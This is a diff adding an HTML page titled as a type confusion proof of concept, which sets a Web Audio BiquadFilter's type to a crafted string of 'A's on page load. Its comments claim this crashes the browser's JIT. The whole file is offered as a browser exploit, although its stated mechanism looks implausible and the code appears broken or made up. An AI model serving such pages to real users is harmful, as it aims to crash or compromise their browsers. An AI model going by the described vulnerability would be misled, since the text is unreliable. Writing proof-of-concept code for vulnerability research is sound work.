@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Type Confusion PoC</title>
+</head>
+<body>
+<script>
+  function triggerVulnerability() {
+    let audioCtx = new AudioContext();
+    let biquadFilter = audioCtx.createBiquadFilter();
+
+    // This string is crafted to be misinterpreted as a valid pointer
+    // when the JIT calls the uint32_t version of setType.
+    let malicious_string = "AAAAAAAAAAAAAAAA";
+
+    try {
+      // This will trigger the type confusion.
+      biquadFilter.type = malicious_string;
+    } catch (e) {
+      // The browser will likely crash before this is reached.
+      console.log("Error setting type, but that's expected.", e);
+    }
+  }
+
+  // We run this in a timeout to make sure the page has loaded.
+  setTimeout(triggerVulnerability, 100);
+</script>
+</body>
+</html>
